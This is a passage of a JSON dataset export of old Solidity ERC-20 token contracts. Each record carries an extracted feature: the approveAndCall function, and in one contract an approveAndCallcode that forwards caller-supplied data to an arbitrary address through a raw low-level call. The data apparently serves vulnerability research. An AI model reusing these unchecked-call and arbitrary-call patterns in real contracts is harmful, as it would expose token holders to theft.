SouthAfricanRandsToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SouthAfricanRandsToken(\n ) {\n balances[msg.sender] = 1000000000000000000;\n totalSupply = 1000000000000000000;\n name = \"South African Rands Token\";\n decimals = 8;\n symbol = 'ZARt';\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e7"
  },
  "filename": "36209.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract LennartCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function LennartCoin(\n ) {\n balances[msg.sender] = 150000000;\n totalSupply = 150000000;\n name = \"LENNARTCOIN\";\n decimals = 3;\n symbol = \"LEN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e8"
  },
  "filename": "36228.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CNYToken is StandardToken {\n function () {\n throw;\n }\n address public founder;\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'CNY0.1';\n mapping(address => uint256) nonces;\n mapping(address => string) lastComment;\n mapping (address => mapping (uint256 => string)) comments;\n function CNYToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol) {\n founder = msg.sender;\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function transferWithComment(address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n lastComment[msg.sender] = _comment;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFromWithComment(address _from, address _to, uint256 _value, string _comment) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n lastComment[_from] = _comment;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _fee,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool){\n if(balances[_from] < _fee + _value) throw;\n uint256 nonce = nonces[_from];\n bytes32 h = sha3(_from,_to,_value,_fee,nonce);\n if(_from != ecrecover(h,_v,_r,_s)) throw;\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _fee < balances[msg.sender]) throw;\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _fee;\n Transfer(_from, msg.sender, _fee);\n balances[_from] -= _value + _fee;\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s, string _comment) returns (bool success) {\n uint256 nonce = nonces[_from];\n bytes32 hash = sha3(_from,_spender,_value,nonce);\n if(_from != ecrecover(hash,_v,_r,_s)) throw;\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n lastComment[_from] = _comment;\n comments[_from][nonce] = _comment;\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) constant returns (uint256){\n return nonces[_addr];\n }\n function getLastComment(address _addr) constant returns (string){\n return lastComment[_addr];\n }\n function getSpecifiedComment(address _addr, uint256 _nonce) constant returns (string){\n if (nonces[_addr] < _nonce) throw;\n return comments[_addr][_nonce];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { throw; }\n return true;\n }\n event Burn(address indexed from, uint256 value);\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] < _value) throw;\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) returns (bool success) {\n if (balances[_from] < _value) throw;\n if (_value > allowed[_from][msg.sender]) throw;\n balances[_from] -= _value;\n totalSupply -= _value;\n Burn(_from, _value);\n return true;\n }\n event Increase(address _to, uint256 _value);\n function allocateTokens(address _to, uint256 _value) {\n if(msg.sender != founder) throw;\n if(totalSupply + _value <= totalSupply || balances[_to] + _value <= balances[_to]) throw;\n totalSupply += _value;\n balances[_to] += _value;\n Increase(_to,_value);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15e9"
  },
  "filename": "36321.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Shard is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Shard(\n ) {\n balances[msg.sender] = 100000000000000000000;\n totalSupply = 100000000000000000000;\n name = \"Shard\";\n decimals = 18;\n symbol = \"SHRD\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ea"
  },
  "filename": "36329.sol",
  "content": "pragma solidity ^0.4.16;\ncontract EROSToken {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\nlibrary EROMaths {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b > 0);\n uint256 c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n address public newOwner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier validAddress(address _address) {\n require(_address != 0x0);\n _;\n }\n function transferOwnership(address _newOwner) onlyOwner {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function acceptOwnership() {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n}\ncontract EroStandardToken is EROSToken, Ownable {\n using EROMaths for uint256;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n mapping (address => bool) public frozenAccount;\n event FrozenFunds(address target, bool frozen);\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function freezeAccount(address target, bool freeze) onlyOwner {\n frozenAccount[target] = freeze;\n FrozenFunds(target, freeze);\n }\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (balances[msg.sender] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (frozenAccount[msg.sender]) return false;\n require(\n (allowed[_from][msg.sender] >= _value)\n && (balances[_from] >= _value)\n && (_value > 0)\n && (_to != address(0))\n && (balances[_to].add(_value) >= balances[_to])\n && (msg.data.length >= (2 * 32) + 4)\n );\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract EROSCOIN is EroStandardToken {\n uint256 constant public decimals = 8;\n uint256 public totalSupply = 240 * (10**7) * 10**8 ;\n string constant public name = \"EROSCOIN\";\n string constant public symbol = \"ERO\";\n string constant public version = \"v1.1.3\";\n function EROSCOIN(){\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15eb"
  },
  "filename": "36330.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract XeroBest is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function XeroBest(\n ) {\n balances[msg.sender] = 333333333;\n totalSupply = 333333333;\n name = \"Xero Coin Best One\";\n decimals = 0;\n symbol = \"XEROBEST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ec"
  },
  "filename": "36375.sol",
  "content": "pragma solidity ^0.4.15;\ncontract ERC20 {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Token is ERC20 {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CJXToken is Token {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'CJX0.1';\n function CJXToken() {\n balances[msg.sender] = 1000000000000000000000000;\n totalSupply = 1000000000000000000000000;\n name = \"CJX COIN\";\n decimals = 18;\n symbol = \"CJX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ed"
  },
  "filename": "36381.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract CNYToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'C0.1';\n function CNYToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n event Burn(address indexed from, uint256 value);\n function burn(uint256 _value) returns (bool success) {\n if (balances[msg.sender] < _value) throw;\n balances[msg.sender] -= _value;\n totalSupply -= _value;\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint256 _value) returns (bool success) {\n if (balances[_from] < _value) throw;\n if (_value > allowed[_from][msg.sender]) throw;\n balances[_from] -= _value;\n totalSupply -= _value;\n Burn(_from, _value);\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ee"
  },
  "filename": "36406.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb15ef"
  },
  "filename": "36472.sol",
  "content": "pragma solidity ^0.4.4;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n using SafeMath for uint256;\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CrypteriumToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function CrypteriumToken(\n ) {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Crypterium\";\n 